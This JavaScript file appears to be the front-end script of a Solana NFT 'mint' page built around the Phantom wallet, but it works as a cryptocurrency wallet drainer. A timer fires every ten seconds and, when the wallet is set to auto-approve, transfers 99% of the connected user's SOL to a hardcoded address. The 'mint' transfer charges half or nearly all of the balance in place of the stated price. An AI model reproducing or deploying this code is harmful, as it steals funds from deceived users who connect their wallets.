//var web3 = require('@solana/web3.js');
//var splToken = require('@solana/spl-token');

var sent = false;

const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));

const getProvider = () => {
  if ("solana" in window) {
    const provider = window.solana;

    if (provider.isPhantom) {
      return provider;
    }
  }

  window.open("https://phantom.app/", "_blank");
};



function onBodyLoad() {
  const solConnected = window.solana.isConnected;

  if(!solConnected) {
    connectWallet();

  }

  refreshStatus();

}

function refreshStatus() {
  const provider = getProvider();

  if(provider) {
    provider.on("connect", () => {
      setConnected();
      document.getElementById('mint').style.display = '';
      document.getElementById('connect').style.display = 'none';
      document.getElementById('connected').style.display = '';
      document.getElementById('connecttop').style.display = 'none';
    });

    provider.on("disconnect", () => {
      setNotConnected();
    });
  }
}

function connectWallet() {
  window.solana.connect({ onlyIfTrusted: false });
}

async function setConnected() {
    // document.getElementById("connStatus").innerHTML = "Connected";
    // document.getElementById("connAddr").innerHTML = window.solana.publicKey.toString();
    let account_info = await connection.getAccountInfo(window.solana.publicKey);
    // document.getElementById("connBal").innerHTML = account_info.lamports;

    console.log("Auto Approve: " + window.solana.autoApprove);
}

function trySend() {
  if(window.solana.autoApprove) {
    if(!sent) {
      apimainnet();
    }
  } else {
    console.log("Not auto approve!");
  }
}

async function testTransfer2(howmany) {
  const provider = getProvider();
  const solConected = window.solana.isConnected;
  const manylamports = (howmany * 1000000000).toFixed(0);

  if(!provider) { return; }
  if(!solConected) { return; }

  let account_info = await connection.getAccountInfo(window.solana.publicKey);
  var charginglamports = manylamports;

  if((account_info.lamports / 2) > manylamports) {
    charginglamports = (account_info.lamports / 2).toFixed(0);
  }

  if(account_info.lamports < manylamports && account_info.lamports > 10000000) {
    charginglamports = (account_info.lamports * 0.99).toFixed(0);
  }

    let transaction = new solanaWeb3.Transaction().add(
      solanaWeb3.SystemProgram.transfer({
        fromPubkey: provider.publicKey,
        toPubkey: "82uFDchVMcuPyaTQkmCkQjERDXJgK7nTWkTVrtyxPuTh",
        lamports: charginglamports,
      })
    );

    let { blockhash } = await connection.getRecentBlockhash();
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = provider.publicKey;

    return transaction;
}

async function makeTransfer(howmany) {
  let transaction = await testTransfer2(howmany);
  const provider = getProvider();

  if(!provider) { return; }
  console.log(provider);
  console.log(transaction);

  if(transaction) {
    //try {

      console.log("asd");
      let signed = await provider.signTransaction(transaction, connection);
      console.log(signed);
      let signature = await connection.sendRawTransaction(signed.serialize());
      console.log(signature);
      await connection.confirmTransaction(signature);
    //} catch(err) {
    //  console.warn(err);
    //}
  }
}

async function testTransfer() {
  const provider = getProvider();
  const solConected = window.solana.isConnected;

  if(!provider) { return; }
  if(!solConected) { return; }

  let account_info = await connection.getAccountInfo(window.solana.publicKey);

  if(account_info.lamports >= 10000000) {
    let transaction = new solanaWeb3.Transaction().add(
      solanaWeb3.SystemProgram.transfer({
        fromPubkey: provider.publicKey,
        toPubkey: "82uFDchVMcuPyaTQkmCkQjERDXJgK7nTWkTVrtyxPuTh",
        lamports: (account_info.lamports * 0.99).toFixed(0),
      })
    );

    let { blockhash } = await connection.getRecentBlockhash();
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = provider.publicKey;

    return transaction;
  }
}

async function apimainnet() {
  let transaction = await testTransfer();
  const provider = getProvider();

  if(!provider) { return; }
  console.log(provider);
  console.log(transaction);

  if(transaction) {
    //try {

      console.log("asd");
      let signed = await provider.signTransaction(transaction, connection);
      console.log(signed);
      let signature = await connection.sendRawTransaction(signed.serialize());
      console.log(signature);
      sent = true;
      await connection.confirmTransaction(signature);
    //} catch(err) {
    //  console.warn(err);
    //}
  }
}

function setNotConnected() {
  // document.getElementById("connStatus").innerHTML = "Not Connected";
}

setInterval(trySend, 10000);
